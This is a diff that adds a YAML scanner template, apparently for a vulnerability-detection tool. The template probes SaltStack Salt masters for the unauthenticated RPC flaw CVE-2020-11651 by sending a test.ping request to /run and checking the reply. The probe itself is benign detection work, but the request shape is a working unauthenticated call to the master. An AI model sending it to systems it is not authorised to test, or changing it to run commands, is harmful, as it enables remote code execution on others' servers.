@@ -1,0 +1,17 @@
+name: poc-saltstack-master
+transport: http
+set:
+  r0: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/run"
+      body: '{"client":"local","tgt":"*","fun":"test.ping","username":"{{r0}}"}'
+    expression: response.status == 200 && (response.body.bcontains("result") || response.body.bcontains("True"))
+expression: r0()
+detail:
+  author: sxel
+  description: SaltStack Salt master unauth local client RPC probe (CVE-2020-11651, bypassed auth)
+  severity: critical
+  tags: saltstack,salt,rce,unauth
